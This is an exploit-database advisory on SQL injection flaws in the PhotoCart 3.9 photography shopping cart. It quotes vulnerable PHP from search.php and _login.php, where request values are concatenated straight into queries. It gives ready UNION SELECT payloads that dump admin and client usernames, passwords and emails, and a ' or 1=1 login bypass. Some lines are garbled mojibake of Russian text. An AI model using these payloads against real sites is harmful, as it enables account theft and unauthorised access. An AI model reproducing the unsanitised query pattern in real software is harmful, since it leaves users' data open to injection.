PhotoCart <= 3.9 Multiple Remote SQL Injection Vulnerabilities
==============================================================


1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1


Date found: 18.08.08
Product: PhotoCart
Version: 3.9 Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ Ð¸ Ð±Ð¾Ð»ÐµÐµ Ñ€Ð°Ð½Ð½Ð¸Ðµ Ð²ÐµÑ€ÑÐ¸Ð¸
Type: Photography Shopping Cart
URL: www.picturespro.com
Vulnerability Class: SQL Injection

/[installdir]/search.php

Vuln code:

PHP:
if($_REQUEST[&#039;searchby&#039;] == "qtitle") {
$gal_where[&#039;where&#039;] = "WHERE gal_status=&#039;1&#039; AND gal_client!=&#039;1 &#039;$and_expire AND gal_title LIKE &#039;%".$_REQUEST[&#039;qtitle&#039;]."%&#039; ";
print "Results for Gallery or event name: ".$_REQUEST[&#039;qtitle&#039;]." ";
}
if($_REQUEST[&#039;searchby&#039;] == "qid") {
$gal_where[&#039;where&#039;] = "WHERE gal_status=&#039;1&#039; AND gal_client!=&#039;1 &#039;$and_expire AND gal_id=&#039;".$_REQUEST[&#039;qid&#039;]."&#039; ";
print "Results for Gallery or event ID: ".$_REQUEST[&#039;qid&#039;]." ";
}
if($_REQUEST[&#039;searchby&#039;] == "qdate") {
$gdate = "".$_REQUEST[&#039;qyear&#039;]."-".$_REQUEST[&#039;qmonth&#039;]."-".$_REQUEST[&#039;qday&#039;]."";
$gal_where[&#039;where&#039;] = "WHERE gal_status=&#039;1&#039; AND gal_client!=&#039;1 &#039;$and_expire AND gal_date=&#039;$gdate&#039; ";
print "Results for Gallery or event date: ".$_REQUEST[&#039;qmonth&#039;]."-".$_REQUEST[&#039;qday&#039;]."-".$_REQUEST[&#039;qyear&#039;]." ";
}


magic_quotes_gpc = Off

Example:
http://[server]/[installdir]/search.php

Ð’Ð²Ð¾Ð´Ð¸Ð¼ Ð² Ð¿Ð¾Ð»Ðµ Gallery or event name:

Exploit 1:

&#039; union select 1,2,3,4,5,concat_ws(0x3a,admin_user,admin_pass),7, 8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,2 5,26 from admin/*



Exploit 2:

&#039; union select 1,2,3,4,5,concat_ws(0x3a,client_name,client_pass,c lient_email),7,8,9,10,11,12,13,14,15,16,17,18,19,2 0,21,22,23,24,25,26 from pc_clients/*



Authentication Bypass SQL Injection

/[installdir]/_login.php

Vuln code:

PHP:
$result = @mysql_query("SELECT * FROM pc_clients WHERE client_email=&#039;".$_REQUEST[&#039;email&#039;]."&#039; AND client_pass=&#039;".$_REQUEST[&#039;password&#039;]."&#039;");


Email Address: 1&#039; or 1=1/*
Password: 1&#039; or 1=1/*



